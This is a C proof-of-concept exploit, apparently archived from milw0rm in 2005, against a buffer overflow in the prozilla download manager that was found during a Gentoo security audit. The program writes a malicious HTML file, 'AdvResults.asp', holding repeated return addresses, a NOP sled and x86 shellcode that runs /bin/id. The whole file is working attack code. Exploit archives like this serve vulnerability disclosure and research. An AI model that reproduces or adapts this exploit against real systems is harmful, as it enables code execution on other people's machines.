#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define OVERFLOW (1<<10)+32
#define SLEDSIZ (1<<10)
#define RETADDR 0x806977a+SLEDSIZ/2
#define OUTPUT "AdvResults.asp"

/*
* prozilla bug, found while auditing for gentoo bug #70090 
* -taviso@gentoo.org
*/

/* execve() /bin/id */
unsigned char shellcode[] =
"\x33\xc9\x83\xe9\xf5\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x7e"
"\x02\xad\x8e\x83\xeb\xfc\xe2\xf4\x14\x09\xf5\x17\x2c\x64\xc5\xa3"
"\x1d\x8b\x4a\xe6\x51\x71\xc5\x8e\x16\x2d\xcf\xe7\x10\x8b\x4e\xdc"
"\x96\x0a\xad\x8e\x7e\x2d\xcf\xe7\x10\x2d\xc4\xea\x7e\x55\xfe\x07"
"\x9f\xcf\x2d\x8e";

int main(int argc, char **argv)
{
unsigned char *buf;
void *ret = (void *) RETADDR;
FILE *exploit;
int i;

exploit = fopen(OUTPUT, "w");
fprintf(exploit, "<PRE><A HREF=>");

buf = malloc(OVERFLOW);
for (i = 0; buf + i < buf + OVERFLOW; i += sizeof(void *))
memcpy(buf + i, &ret, sizeof(void *));
fwrite(buf, OVERFLOW, 1, exploit);
fprintf(exploit, "</A><A HREF=></A><A HREF=></A></PRE>");
buf = realloc(buf, SLEDSIZ + sizeof(shellcode));
memset(buf, 0x90, SLEDSIZ);
memcpy(buf + SLEDSIZ, shellcode, sizeof(shellcode));
fwrite(buf, SLEDSIZ + sizeof(shellcode), 1, exploit);
free(buf);
fprintf(stderr, "[*] %s created.\n", OUTPUT);
return 0;
}

// milw0rm.com [2005-10-02]
